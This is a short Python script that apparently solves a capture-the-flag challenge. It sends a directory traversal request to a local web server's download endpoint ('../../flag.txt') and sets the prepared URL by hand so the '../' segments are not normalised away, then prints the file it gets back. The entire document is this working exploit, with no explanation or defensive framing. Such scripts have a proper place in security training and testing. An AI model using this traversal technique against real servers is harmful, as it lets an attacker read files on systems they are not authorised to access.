import requests

url = "http://localhost:5000/download/../../flag.txt"

s = requests.Session()
req = requests.Request("GET", url) 
prep = req.prepare()
prep.url = url
resp = s.send(prep)
print(resp.text)